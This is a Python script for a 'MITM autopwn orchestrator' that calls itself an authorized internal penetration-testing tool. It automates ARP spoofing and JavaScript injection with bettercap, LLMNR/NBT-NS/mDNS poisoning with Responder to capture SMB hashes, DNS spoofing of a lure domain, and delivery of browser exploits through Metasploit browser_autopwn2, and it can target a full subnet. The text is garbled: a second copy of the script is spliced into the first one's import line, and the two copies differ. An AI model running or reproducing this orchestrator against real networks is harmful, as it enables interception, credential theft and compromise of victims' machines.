#!/usr/bin/env python3
"""
MITM autopwn orchestrator.
Standalone tool for authorized internal network penetration testing. Sequences
bettercap layer two interception with javascript injection, Responder LLMNR,
NBT-NS, and mDNS poisoning with SMB hash capture, and Metasploit
browser_autopwn2 delivery, presented through a three panel TUI. A scope guard
resolves the operator interface addresses and the default gateway and refuses to
spoof either. Full subnet spoofing is explicit opt in.
"""

import os#!/usr/bin/env python3
"""
MITM autopwn orchestrator.
Standalone tool for authorized internal network penetration testing. Sequences
bettercap layer two interception with javascript injection, Responder LLMNR,
NBT-NS, and mDNS poisoning with SMB hash capture, and Metasploit
browser_autopwn2 delivery, presented through a three panel TUI. A scope guard
resolves the operator interface addresses and the default gateway and refuses to
spoof either. Full subnet spoofing is explicit opt in.
"""

import os
import sys
import json
import time
import signal
import argparse
import ipaddress
import threading

import system
from state import SharedState


CONFIG_FILE = os.path.expanduser("~/.orchestration_config")


def parse_args():
    p = argparse.ArgumentParser(
        description="MITM autopwn orchestrator for authorized internal testing")
    p.add_argument("-i", "--interface", required=True,
                   help="interface on the target segment")
    p.add_argument("-t", "--targets",
                   help="target as CIDR or comma separated hosts")
    p.add_argument("--hosts-file", help="file of target hosts, one per line")
    p.add_argument("--full-subnet", action="store_true",
                   help="opt in to spoofing the full interface subnet minus self and gateway")
    p.add_argument("--lure-domain",
                   help="optional domain to dns.spoof to the autopwn landing for https only victims")
    p.add_argument("--lure-port", type=int, default=80,
                   help="port for the lure bounce redirector")
    p.add_argument("--lhost",
                   help="operator address on the target segment for callbacks and SRVURI")
    p.add_argument("--srvport", type=int, default=8888, help="autopwn server port")
    p.add_argument("--uripath", default="update", help="autopwn landing path")
    p.add_argument("--exclude-pattern",
                   help="regex passed to browser_autopwn2 EXCLUDE_PATTERN to drop noisy modules")
    p.add_argument("--responder-path", help="path to Responder.py")
    p.add_argument("--msf-pass", default="autopwn", help="msfrpcd password")
    p.add_argument("--msf-port", type=int, default=55553, help="msfrpcd port")
    p.add_argument("--bettercap-port", type=int, default=8081, help="bettercap REST API port")
    p.add_argument("--bettercap-user", default="orchestrator", help="bettercap REST API user")
    p.add_argument("--bettercap-pass", default="orchestrator", help="bettercap REST API password")
    return p.parse_args()


def load_config():
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as fh:
                return json.load(fh)
        except Exception:
            return {}
    return {}


def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w") as fh:
            json.dump(cfg, fh, indent=2)
    except Exception:
        pass


def die(message):
    sys.stderr.write("error: %s\n" % message)
    sys.exit(1)


def resolve_lhost(iface, explicit):
    if explicit:
        return explicit
    addrs = system.interface_addresses(iface)
    if not addrs:
        die("no IPv4 address on %s, pass --lhost" % iface)
    return addrs[0]


def _expand_token(token):
    try:
        if "/" in token:
            net = ipaddress.ip_network(token, strict=False)
            return {str(h) for h in net.hosts()}
        return {str(ipaddress.ip_address(token))}
    except ValueError:
        die("invalid target %s" % token)


def _interface_subnet_hosts(iface):
    cidr = system.interface_cidr(iface)
    if not cidr:
        die("could not derive subnet for %s" % iface)
    net = ipaddress.ip_network(cidr, strict=False)
    return {str(h) for h in net.hosts()}


def build_target_set(args, iface):
    """
    Expand requested targets, then strip every operator address and the default
    gateway. Returns the vetted list, the removed protected addresses, and the
    gateway for reporting.
    """
    local_addrs = system.local_ipv4_addresses()
    gateway = system.default_gateway()
    excluded = set(local_addrs)
    if gateway:
        excluded.add(gateway)

    requested = set()
    if args.targets:
        for token in args.targets.split(","):
            token = token.strip()
            if token:
                requested |= _expand_token(token)
    if args.hosts_file:
        if not os.path.isfile(args.hosts_file):
            die("hosts file not found %s" % args.hosts_file)
        with open(args.hosts_file) as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    requested |= _expand_token(line)
    if args.full_subnet:
        requested |= _interface_subnet_hosts(iface)

    if not requested:
        die("no targets given, use --targets, --hosts-file, or --full-subnet")

    vetted = sorted(requested - excluded, key=lambda ip: ipaddress.ip_address(ip))
    removed = sorted(requested & excluded, key=lambda ip: ipaddress.ip_address(ip))
    return vetted, removed, gateway


def resolve_dependencies(cfg):
    """
    Return absolute paths for every required dependency. A cached config value is
    trusted when it still points at a real file that lives outside this tool's own
    directory, otherwise the dependency is rediscovered and the cache is
    refreshed. Paths inside this tool's directory are refused from both cache and
    discovery, so a search for Responder.py can never latch onto this tool's own
    responder.py module. Exits if one cannot be located.
    """
    selfdir = os.path.dirname(os.path.realpath(__file__))

    def usable(candidate):
        return (bool(candidate) and os.path.isfile(candidate)
                and not os.path.realpath(candidate).startswith(selfdir + os.sep))

    cached = cfg.get("binaries", {})
    resolved = {}
    for key in system.DEPENDENCIES:
        path = cached.get(key)
        if usable(path):
            resolved[key] = path
            continue
        found = system.discover_dependency(key)
        if not usable(found):
            die("dependency %s did not resolve to a usable path outside this "
                "tool's directory, install it or set binaries.%s in %s"
                % (key, key, CONFIG_FILE))
        resolved[key] = found
    cfg["binaries"] = resolved
    return resolved


def preflight(args, cfg):
    system.ensure_root()
    if not system.interface_exists(args.interface):
        die("interface %s does not exist" % args.interface)
    if not system.interface_is_up(args.interface):
        die("interface %s is not up" % args.interface)
    if args.responder_path:
        if not os.path.isfile(args.responder_path):
            die("responder path %s does not exist" % args.responder_path)
        cfg.setdefault("binaries", {})["responder"] = args.responder_path
    return resolve_dependencies(cfg)


def main():
    system.bootstrap_and_reexec()

    args = parse_args()
    cfg = load_config()

    paths = preflight(args, cfg)
    save_config(cfg)
    responder_path = paths["responder"]
    bettercap_bin = paths["bettercap"]
    msfrpcd_bin = paths["msfrpcd"]

    iface = args.interface
    lhost = resolve_lhost(iface, args.lhost)
    targets, removed, gateway = build_target_set(args, iface)

    print("[*] bettercap %s" % bettercap_bin)
    print("[*] msfrpcd %s" % msfrpcd_bin)
    print("[*] responder %s" % responder_path)
    print("[*] operator lhost %s on %s" % (lhost, iface))
    print("[*] default gateway %s" % (gateway or "unknown"))
    if removed:
        print("[*] scope guard removed %d protected address(es) %s"
              % (len(removed), ", ".join(removed)))
    print("[*] spoof targets %d" % len(targets))
    if not targets:
        die("no targets remain after scope guard")

    from mitm import BettercapClient, LureRedirector
    from responder import ResponderRunner
    from msf import MetasploitAutopwn
    from tui import run_tui

    state = SharedState()
    stop_event = threading.Event()

    msf = MetasploitAutopwn(state, password=args.msf_pass, port=args.msf_port,
                            lhost=lhost, srvport=args.srvport, uripath=args.uripath,
                            exclude_pattern=args.exclude_pattern, binary=msfrpcd_bin)
    responder = ResponderRunner(responder_path, iface, state)
    bettercap = BettercapClient(iface, state, api_port=args.bettercap_port,
                                api_user=args.bettercap_user, api_pass=args.bettercap_pass,
                                binary=bettercap_bin)
    lure = None

    torn = threading.Event()

    def teardown():
        if torn.is_set():
            return
        torn.set()
        stop_event.set()
        state.set_phase("teardown", "restoring")
        for fn in (bettercap.stop, responder.stop, msf.stop):
            try:
                fn()
            except Exception:
                pass
        if lure is not None:
            try:
                lure.stop()
            except Exception:
                pass

    def handle_signal(*_):
        stop_event.set()

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    try:
        state.set_phase("metasploit", "starting msfrpcd")
        msf.start_daemon()
        msf.connect()
        srvuri = msf.setup_autopwn()
        print("[*] autopwn SRVURI %s" % srvuri)

        state.set_phase("responder", "starting poisoners")
        responder.patch_conf()
        responder.run()

        state.set_phase("bettercap", "arming interception")
        bettercap.launch()
        bettercap.start_proxy_inject(srvuri)
        bettercap.start_spoof(targets)

        if args.lure_domain:
            lure = LureRedirector(lhost, args.lure_port, srvuri, state)
            lure.start()
            bettercap.start_dns_spoof(args.lure_domain, lhost)

        state.set_phase("running", "interception live")

        workers = [
            ("bettercap-events", bettercap.read_events),
            ("responder-monitor", responder.monitor),
            ("msf-console", msf.monitor_console),
            ("msf-sessions", msf.monitor_sessions),
        ]
        for name, target in workers:
            threading.Thread(target=target, args=(stop_event,),
                             name=name, daemon=True).start()

        run_tui(state, stop_event)

    except Exception as exc:
        stop_event.set()
        sys.stderr.write("fatal: %s\n" % exc)
    finally:
        teardown()
        time.sleep(1.0)


if __name__ == "__main__":
    main()
import sys
import json
import time
import signal
import argparse
import ipaddress
import threading

import system
from state import SharedState


CONFIG_FILE = os.path.expanduser("~/.orchestration_config")


def parse_args():
    p = argparse.ArgumentParser(
        description="MITM autopwn orchestrator for authorized internal testing")
    p.add_argument("-i", "--interface", required=True,
                   help="interface on the target segment")
    p.add_argument("-t", "--targets",
                   help="target as CIDR or comma separated hosts")
    p.add_argument("--hosts-file", help="file of target hosts, one per line")
    p.add_argument("--full-subnet", action="store_true",
                   help="opt in to spoofing the full interface subnet minus self and gateway")
    p.add_argument("--lure-domain",
                   help="optional domain to dns.spoof to the autopwn landing for https only victims")
    p.add_argument("--lure-port", type=int, default=80,
                   help="port for the lure bounce redirector")
    p.add_argument("--lhost",
                   help="operator address on the target segment for callbacks and SRVURI")
    p.add_argument("--srvport", type=int, default=8888, help="autopwn server port")
    p.add_argument("--uripath", default="update", help="autopwn landing path")
    p.add_argument("--exclude-pattern",
                   help="regex passed to browser_autopwn2 EXCLUDE_PATTERN to drop noisy modules")
    p.add_argument("--responder-path", help="path to Responder.py")
    p.add_argument("--msf-pass", default="autopwn", help="msfrpcd password")
    p.add_argument("--msf-port", type=int, default=55553, help="msfrpcd port")
    p.add_argument("--bettercap-port", type=int, default=8081, help="bettercap REST API port")
    p.add_argument("--bettercap-user", default="orchestrator", help="bettercap REST API user")
    p.add_argument("--bettercap-pass", default="orchestrator", help="bettercap REST API password")
    return p.parse_args()


def load_config():
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as fh:
                return json.load(fh)
        except Exception:
            return {}
    return {}


def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w") as fh:
            json.dump(cfg, fh, indent=2)
    except Exception:
        pass


def die(message):
    sys.stderr.write("error: %s\n" % message)
    sys.exit(1)


def resolve_lhost(iface, explicit):
    if explicit:
        return explicit
    addrs = system.interface_addresses(iface)
    if not addrs:
        die("no IPv4 address on %s, pass --lhost" % iface)
    return addrs[0]


def _expand_token(token):
    try:
        if "/" in token:
            net = ipaddress.ip_network(token, strict=False)
            return {str(h) for h in net.hosts()}
        return {str(ipaddress.ip_address(token))}
    except ValueError:
        die("invalid target %s" % token)


def _interface_subnet_hosts(iface):
    cidr = system.interface_cidr(iface)
    if not cidr:
        die("could not derive subnet for %s" % iface)
    net = ipaddress.ip_network(cidr, strict=False)
    return {str(h) for h in net.hosts()}


def build_target_set(args, iface):
    """
    Expand requested targets, then strip every operator address and the default
    gateway. Returns the vetted list, the removed protected addresses, and the
    gateway for reporting.
    """
    local_addrs = system.local_ipv4_addresses()
    gateway = system.default_gateway()
    excluded = set(local_addrs)
    if gateway:
        excluded.add(gateway)

    requested = set()
    if args.targets:
        for token in args.targets.split(","):
            token = token.strip()
            if token:
                requested |= _expand_token(token)
    if args.hosts_file:
        if not os.path.isfile(args.hosts_file):
            die("hosts file not found %s" % args.hosts_file)
        with open(args.hosts_file) as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    requested |= _expand_token(line)
    if args.full_subnet:
        requested |= _interface_subnet_hosts(iface)

    if not requested:
        die("no targets given, use --targets, --hosts-file, or --full-subnet")

    vetted = sorted(requested - excluded, key=lambda ip: ipaddress.ip_address(ip))
    removed = sorted(requested & excluded, key=lambda ip: ipaddress.ip_address(ip))
    return vetted, removed, gateway


def resolve_dependencies(cfg):
    """
    Return absolute paths for every required dependency. Cached config values are
    trusted when they still point at a real file, otherwise the dependency is
    rediscovered and the cache is refreshed. Exits if one cannot be located.
    """
    cached = cfg.get("binaries", {})
    resolved = {}
    for key in system.DEPENDENCIES:
        path = cached.get(key)
        if path and os.path.isfile(path):
            resolved[key] = path
            continue
        found = system.discover_dependency(key)
        if not found:
            die("dependency %s not found, install it or set binaries.%s in %s"
                % (key, key, CONFIG_FILE))
        resolved[key] = found
    cfg["binaries"] = resolved
    return resolved


def preflight(args, cfg):
    system.ensure_root()
    if not system.interface_exists(args.interface):
        die("interface %s does not exist" % args.interface)
    if not system.interface_is_up(args.interface):
        die("interface %s is not up" % args.interface)
    if args.responder_path:
        if not os.path.isfile(args.responder_path):
            die("responder path %s does not exist" % args.responder_path)
        cfg.setdefault("binaries", {})["responder"] = args.responder_path
    return resolve_dependencies(cfg)


def main():
    system.bootstrap_and_reexec()

    args = parse_args()
    cfg = load_config()

    paths = preflight(args, cfg)
    save_config(cfg)
    responder_path = paths["responder"]
    bettercap_bin = paths["bettercap"]
    msfrpcd_bin = paths["msfrpcd"]

    iface = args.interface
    lhost = resolve_lhost(iface, args.lhost)
    targets, removed, gateway = build_target_set(args, iface)

    print("[*] bettercap %s" % bettercap_bin)
    print("[*] msfrpcd %s" % msfrpcd_bin)
    print("[*] responder %s" % responder_path)
    print("[*] operator lhost %s on %s" % (lhost, iface))
    print("[*] default gateway %s" % (gateway or "unknown"))
    if removed:
        print("[*] scope guard removed %d protected address(es) %s"
              % (len(removed), ", ".join(removed)))
    print("[*] spoof targets %d" % len(targets))
    if not targets:
        die("no targets remain after scope guard")

    from mitm import BettercapClient, LureRedirector
    from responder import ResponderRunner
    from msf import MetasploitAutopwn
    from tui import run_tui

    state = SharedState()
    stop_event = threading.Event()

    msf = MetasploitAutopwn(state, password=args.msf_pass, port=args.msf_port,
                            lhost=lhost, srvport=args.srvport, uripath=args.uripath,
                            exclude_pattern=args.exclude_pattern, binary=msfrpcd_bin)
    responder = ResponderRunner(responder_path, iface, state)
    bettercap = BettercapClient(iface, state, api_port=args.bettercap_port,
                                api_user=args.bettercap_user, api_pass=args.bettercap_pass,
                                binary=bettercap_bin)
    lure = None

    torn = threading.Event()

    def teardown():
        if torn.is_set():
            return
        torn.set()
        stop_event.set()
        state.set_phase("teardown", "restoring")
        for fn in (bettercap.stop, responder.stop, msf.stop):
            try:
                fn()
            except Exception:
                pass
        if lure is not None:
            try:
                lure.stop()
            except Exception:
                pass

    def handle_signal(*_):
        stop_event.set()

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    try:
        state.set_phase("metasploit", "starting msfrpcd")
        msf.start_daemon()
        msf.connect()
        srvuri = msf.setup_autopwn()
        print("[*] autopwn SRVURI %s" % srvuri)

        state.set_phase("responder", "starting poisoners")
        responder.patch_conf()
        responder.run()

        state.set_phase("bettercap", "arming interception")
        bettercap.launch()
        bettercap.start_proxy_inject(srvuri)
        bettercap.start_spoof(targets)

        if args.lure_domain:
            lure = LureRedirector(lhost, args.lure_port, srvuri, state)
            lure.start()
            bettercap.start_dns_spoof(args.lure_domain, lhost)

        state.set_phase("running", "interception live")

        workers = [
            ("bettercap-events", bettercap.read_events),
            ("responder-monitor", responder.monitor),
            ("msf-console", msf.monitor_console),
            ("msf-sessions", msf.monitor_sessions),
        ]
        for name, target in workers:
            threading.Thread(target=target, args=(stop_event,),
                             name=name, daemon=True).start()

        run_tui(state, stop_event)

    except Exception as exc:
        stop_event.set()
        sys.stderr.write("fatal: %s\n" % exc)
    finally:
        teardown()
        time.sleep(1.0)


if __name__ == "__main__":
    main()
